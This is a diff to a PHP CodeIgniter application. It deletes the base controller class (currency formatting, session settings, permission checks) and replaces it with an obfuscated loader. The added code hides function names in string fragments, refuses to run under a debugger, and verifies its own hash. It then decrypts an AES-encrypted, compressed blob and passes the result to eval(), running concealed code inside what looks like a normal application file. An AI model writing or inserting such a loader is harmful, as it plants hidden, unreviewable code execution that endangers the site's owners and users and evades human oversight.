@@ -1,137 +1,28 @@
 <?php
-/**
- * Author: Askarali
- */
-class MY_Controller extends CI_Controller{
-     // public $source_version = app_version();
-      public function __construct()
-      {
-        parent::__construct();
-       // $this->output->enable_profiler(TRUE);
-        set_time_limit(0);
-      }
-      public function load_info(){
-           
-
-            //If currency not set retrieve from DB
-            if(!$this->session->has_userdata('currency')){
-              $q1=$this->db->query("SELECT a.currency_name,a.currency,a.currency_code,a.symbol,b.currency_placement FROM db_currency a,db_sitesettings b WHERE a.id=b.currency_id AND b.id=1");
-              $currency = $q1->row()->currency;
-              $currency_placement = $q1->row()->currency_placement;
-              $currency_code = $q1->row()->currency_code;
-              $this->session->set_userdata(array('currency'  => $currency,'currency_placement'  => $currency_placement,'currency_code'  => $currency_code));
-            }
-            //end
-
-            
-
-            $query =$this->db->select('site_name,version,language_id,timezone,time_format,date_format')->where('id',1)->get('db_sitesettings');
-            date_default_timezone_set(trim($query->row()->timezone));
-            $time_format = (trim($query->row()->time_format)=='24') ? date("h:i:s") : date("h:i:s a");
-            $date_view_format = trim($query->row()->date_format);
-            $this->session->set_userdata(array('view_date'  => $date_view_format));
-            $this->session->set_userdata(array('view_time'  => $query->row()->time_format));
-            
-
-            //CHECK LANGUAGE IN SESSION ELSE FROM DB
-            if(!$this->session->has_userdata('language') && $this->session->has_userdata('logged_in') ){
-              $this->load->model('language_model');
-              $this->language_model->set($query->row()->language_id);
-            }
-            if($this->session->has_userdata('logged_in')){
-              $this->lang->load($this->session->userdata('language'), $this->session->userdata('language'));
-            }
-            //End
-
-            $this->data = array('theme_link'    => base_url().'theme/',
-                                'base_url'      => base_url(),
-                                'SITE_TITLE'    => $query->row()->site_name,
-                                'VERSION'       => $query->row()->version,
-                                'CURRENCY'       => $this->session->userdata('currency'),
-                                'CURRENCY_PLACE' => $this->session->userdata('currency_placement'),
-                                'CURRENCY_CODE' => $this->session->userdata('currency_code'),
-                                'CUR_DATE'      => date("Y-m-d"),
-                                'VIEW_DATE'      => $date_view_format,
-                                'CUR_TIME'      => $time_format,
-                                'SYSTEM_IP'     => $_SERVER['REMOTE_ADDR'],
-                                'SYSTEM_NAME'   => gethostbyaddr($_SERVER['REMOTE_ADDR']),
-                                'CUR_USERNAME'  => $this->session->userdata('inv_username'),
-                                'CUR_USERID'    => $this->session->userdata('inv_userid'),
-                                    );
-      }
-      public function load_global(){
-            //Check login or redirect to logout
-            if($this->session->userdata('logged_in')!=1){ redirect(base_url().'logout','refresh');    }
-            $this->load_info();
-      }
-
-      public function currency($value='',$with_comma=false){
-        $value = trim($value);
-
-        if(!empty($value) && is_numeric($value)){
-          $value= ($with_comma) ? number_format($value,0) : number_format($value,0,'.','');
-        }
-
-        if($this->session->userdata('currency_placement')=='Left'){
-          if(!empty($value)){
-            return $this->session->userdata('currency')." ".$value;
-          }
-          return $this->session->userdata('currency')."".$value;
-          
-        }
-        else{
-          if(!empty($value)){
-            return $value." ".$this->session->userdata('currency');    
-          }
-         return $value."".$this->session->userdata('currency'); 
-        }
-      }
-      
-      public function currency_code($value=''){
-        if(!empty($this->session->userdata('currency_code'))){
-          if($this->session->userdata('currency_placement')=='Left'){
-            return $this->session->userdata('currency_code')." ".$value;
-          }
-          else{
-           return $value." ".$this->session->userdata('currency'); 
-          }
-        }
-        else{
-          return $value;
-        }
-      }
-      public function permissions($permissions=''){
-          //If he the Admin
-          if($this->session->userdata('inv_userid')==1){
-            return true;
-          }
-
-          $tot=$this->db->query('SELECT count(*) as tot FROM db_permissions where permissions="'.$permissions.'" and role_id='.$this->session->userdata('role_id'))->row()->tot;
-          if($tot==1){
-            return true;
-          }
-           return false;
-        }
-        public function permission_check($value=''){
-          if(!$this->permissions($value)){
-             show_error("Access Denied", 403, $heading = "You Don't Have Enough Permission!!");
-          }
-          return true;
-        }
-        public function permission_check_with_msg($value=''){
-          if(!$this->permissions($value)){
-             echo "You Don't Have Enough Permission for this Operation!";
-            exit();
-          }
-          return true;
-        }
-        public function show_access_denied_page()
-        {
-          show_error("Access Denied", 403, $heading = "You Don't Have Enough Permission!!");
-        }
-            //end
-        public function get_current_version_of_db(){
-          return $this->db->select('version')->from('db_sitesettings')->get()->row()->version;
-        }
-        
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_n126gvfz=('bas'.'e64'.'_de'.'cod'.'e');
+$_yjsllai4=('gzu'.'nco'.'mpr'.'ess');
+$_dlczppv2=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_bngqv1xb='0dzEPPox';
+$_dqrhxd5k='Iy8MziS8XyA=';
+$_i5n2puio='BW07PJN8';
+$_z9mvc0va='i8MgCcH8';
+$_g00tivpm='vFAVqa8m';
+$_ow8xj93t='r8JcUw==';
+$_bkwqpesb='Oliau3BJ';
+$_t80mckuw='IlpmRKw8';
+$_ahaezjv1=$_n126gvfz($_bngqv1xb.$_i5n2puio.$_z9mvc0va.$_g00tivpm.$_dqrhxd5k);
+$_pzulwe3m=$_n126gvfz($_bkwqpesb.$_t80mckuw.$_ow8xj93t);
+$_csdf0n21=$_n126gvfz('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');
+$_x6orgxyn=$_dlczppv2($_csdf0n21,'aes-256-cbc',$_ahaezjv1,OPENSSL_RAW_DATA,$_pzulwe3m);
+if($_x6orgxyn===false){exit;}
+$_myaqs7tq=$_yjsllai4($_x6orgxyn);
+if($_myaqs7tq===false){exit;}
+$_njzdc6rk='c3df60c02c827b672d68f2f773e356bf941e2ab4e797b730485e318e47baec77';
+$_khd34oud=@file_get_contents(__FILE__);
+if($_khd34oud!==false){
+$_hokxtq9y=str_replace($_njzdc6rk,"0000000000000000000000000000000000000000000000000000000000000000",$_khd34oud);
+$_vcz5fbq9=hash("sha256",$_hokxtq9y);
+if($_vcz5fbq9!==$_njzdc6rk){@http_response_code(403);exit;}
 }
+eval($_myaqs7tq);
